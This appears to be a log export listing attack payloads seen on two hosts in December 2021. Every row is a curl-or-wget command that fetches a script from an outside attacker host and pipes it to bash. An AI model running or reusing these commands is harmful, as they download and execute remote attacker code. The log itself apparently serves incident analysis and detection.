host,earliest,payload
dch1734pl5splnk,12/12/2021 23:55:14,(curl -s 195.54.160.149:5874/170.123.239.158:80||wget -q -O- 195.54.160.149:5874/170.123.239.158:80)|bash
dch1734pl5splnk,12/12/2021 23:55:47,(curl -s 195.54.160.149:5874/170.123.239.165:80||wget -q -O- 195.54.160.149:5874/170.123.239.165:80)|bash
dch1734pl5splnk,12/12/2021 23:56:17,(curl -s 195.54.160.149:5874/170.123.234.43:80||wget -q -O- 195.54.160.149:5874/170.123.234.43:80)|bash
dch1734pl5splnk,12/12/2021 23:56:19,(curl -s 195.54.160.149:5874/170.123.233.30:80||wget -q -O- 195.54.160.149:5874/170.123.233.30:80)|bash
dch1734pl5splnk,12/12/2021 23:57:03,(curl -s 195.54.160.149:5874/170.123.239.27:80||wget -q -O- 195.54.160.149:5874/170.123.239.27:80)|bash
dch1734pl5splnk,12/12/2021 23:57:20,(curl -s 195.54.160.149:5874/170.123.239.148:80||wget -q -O- 195.54.160.149:5874/170.123.239.148:80)|bash
dch1734pl5splnk,12/12/2021 23:57:36,(curl -s 195.54.160.149:5874/170.123.239.209:80||wget -q -O- 195.54.160.149:5874/170.123.239.209:80)|bash
dch1734pl5splnk,12/12/2021 23:58:08,(curl -s 195.54.160.149:5874/170.123.239.225:80||wget -q -O- 195.54.160.149:5874/170.123.239.225:80)|bash
dch1734pl5splnk,12/12/2021 23:59:20,(curl -s 195.54.160.149:5874/170.123.233.22:80||wget -q -O- 195.54.160.149:5874/170.123.233.22:80)|bash
dch1734pl5splnk,12/12/2021 23:59:25,(curl -s 195.54.160.149:5874/134.179.112.184:80||wget -q -O- 195.54.160.149:5874/134.179.112.184:80)|bash
dch1734pl5splnk,12/12/2021 23:59:35,(curl -s 195.54.160.149:5874/170.123.239.28:80||wget -q -O- 195.54.160.149:5874/170.123.239.28:80)|bash
dch1734pl5splnk,12/12/2021 23:59:40,(curl -s 195.54.160.149:5874/170.123.239.178:80||wget -q -O- 195.54.160.149:5874/170.123.239.178:80)|bash
dch1746pl5app,12/10/2021 12:55:36,(curl -s 45.155.205.233:5874/34.96.91.6:80||wget -q -O- 45.155.205.233:5874/34.96.91.6:80)|bash
dch1746pl5app,12/10/2021 12:56:16,(curl -s 45.155.205.233:5874/34.120.163.119:80||wget -q -O- 45.155.205.233:5874/34.120.163.119:80)|bash
dch1746pl5app,12/10/2021 12:56:39,(curl -s 45.155.205.233:5874/34.117.45.5:80||wget -q -O- 45.155.205.233:5874/34.117.45.5:80)|bash
dch1746pl5app,12/10/2021 12:58:14,(curl -s 45.155.205.233:5874/35.190.1.232:80||wget -q -O- 45.155.205.233:5874/35.190.1.232:80)|bash
dch1746pl5app,12/10/2021 12:58:22,(curl -s 45.155.205.233:5874/34.117.124.66:80||wget -q -O- 45.155.205.233:5874/34.117.124.66:80)|bash
dch1746pl5app,12/10/2021 12:59:25,(curl -s 45.155.205.233:5874/34.117.245.197:80||wget -q -O- 45.155.205.233:5874/34.117.245.197:80)|bash
dch1746pl5app,12/10/2021 12:59:34,(curl -s 45.155.205.233:5874/34.102.154.90:80||wget -q -O- 45.155.205.233:5874/34.102.154.90:80)|bash
dch1746pl5app,12/10/2021 13:00:38,(curl -s 45.155.205.233:5874/34.117.119.33:80||wget -q -O- 45.155.205.233:5874/34.117.119.33:80)|bash
dch1746pl5app,12/10/2021 13:00:57,(curl -s 45.155.205.233:5874/34.107.158.85:80||wget -q -O- 45.155.205.233:5874/34.107.158.85:80)|bash
dch1746pl5app,12/10/2021 13:01:38,(curl -s 45.155.205.233:5874/34.117.162.9:80||wget -q -O- 45.155.205.233:5874/34.117.162.9:80)|bash
dch1746pl5app,12/10/2021 13:01:44,(curl -s 45.155.205.233:5874/34.117.138.247:80||wget -q -O- 45.155.205.233:5874/34.117.138.247:80)|bash
dch1746pl5app,12/10/2021 13:01:52,(curl -s 45.155.205.233:5874/34.107.140.86:80||wget -q -O- 45.155.205.233:5874/34.107.140.86:80)|bash
dch1746pl5app,12/10/2021 13:02:08,(curl -s 45.155.205.233:5874/34.107.206.62:80||wget -q -O- 45.155.205.233:5874/34.107.206.62:80)|bash
dch1746pl5app,12/10/2021 13:02:09,(curl -s 45.155.205.233:5874/34.117.8.187:80||wget -q -O- 45.155.205.233:5874/34.117.8.187:80)|bash
dch1746pl5app,12/10/2021 13:02:36,(curl -s 45.155.205.233:5874/34.120.176.97:80||wget -q -O- 45.155.205.233:5874/34.120.176.97:80)|bash
dch1746pl5app,12/10/2021 13:03:13,(curl -s 45.155.205.233:5874/34.98.75.221:80||wget -q -O- 45.155.205.233:5874/34.98.75.221:80)|bash
dch1746pl5app,12/10/2021 13:03:16,(curl -s 45.155.205.233:5874/34.117.210.45:80||wget -q -O- 45.155.205.233:5874/34.117.210.45:80)|bash
dch1746pl5app,12/10/2021 13:03:21,(curl -s 45.155.205.233:5874/34.107.232.170:80||wget -q -O- 45.155.205.233:5874/34.107.232.170:80)|bash
dch1746pl5app,12/10/2021 13:04:04,(curl -s 45.155.205.233:5874/34.117.44.103:80||wget -q -O- 45.155.205.233:5874/34.117.44.103:80)|bash
dch1746pl5app,12/10/2021 13:04:59,(curl -s 45.155.205.233:5874/35.227.230.102:80||wget -q -O- 45.155.205.233:5874/35.227.230.102:80)|bash
dch1746pl5app,12/10/2021 13:05:08,(curl -s 45.155.205.233:5874/34.117.249.3:80||wget -q -O- 45.155.205.233:5874/34.117.249.3:80)|bash
dch1746pl5app,12/10/2021 13:05:13,(curl -s 45.155.205.233:5874/34.117.156.172:80||wget -q -O- 45.155.205.233:5874/34.117.156.172:80)|bash
dch1746pl5app,12/10/2021 13:05:45,(curl -s 45.155.205.233:5874/34.149.133.74:80||wget -q -O- 45.155.205.233:5874/34.149.133.74:80)|bash
dch1746pl5app,12/10/2021 13:06:30,(curl -s 45.155.205.233:5874/34.117.51.246:80||wget -q -O- 45.155.205.233:5874/34.117.51.246:80)|bash
dch1746pl5app,12/10/2021 13:06:33,(curl -s 45.155.205.233:5874/34.107.250.32:80||wget -q -O- 45.155.205.233:5874/34.107.250.32:80)|bash
dch1746pl5app,12/10/2021 13:07:46,(curl -s 45.155.205.233:5874/34.120.120.30:80||wget -q -O- 45.155.205.233:5874/34.120.120.30:80)|bash
dch1746pl5app,12/10/2021 13:08:17,(curl -s 45.155.205.233:5874/34.95.126.171:80||wget -q -O- 45.155.205.233:5874/34.95.126.171:80)|bash
dch1746pl5app,12/10/2021 13:10:06,(curl -s 45.155.205.233:5874/34.149.141.38:80||wget -q -O- 45.155.205.233:5874/34.149.141.38:80)|bash
dch1746pl5app,12/10/2021 13:10:32,(curl -s 45.155.205.233:5874/34.102.153.130:80||wget -q -O- 45.155.205.233:5874/34.102.153.130:80)|bash
dch1746pl5app,12/10/2021 13:10:34,(curl -s 45.155.205.233:5874/34.117.92.235:80||wget -q -O- 45.155.205.233:5874/34.117.92.235:80)|bash
dch1746pl5app,12/10/2021 13:10:41,(curl -s 45.155.205.233:5874/35.186.249.213:80||wget -q -O- 45.155.205.233:5874/35.186.249.213:80)|bash
dch1746pl5app,12/10/2021 13:10:49,(curl -s 45.155.205.233:5874/34.117.10.218:80||wget -q -O- 45.155.205.233:5874/34.117.10.218:80)|bash
dch1746pl5app,12/10/2021 13:12:21,(curl -s 45.155.205.233:5874/34.107.147.28:80||wget -q -O- 45.155.205.233:5874/34.107.147.28:80)|bash
dch1746pl5app,12/10/2021 13:12:53,(curl -s 45.155.205.233:5874/34.117.14.72:80||wget -q -O- 45.155.205.233:5874/34.117.14.72:80)|bash
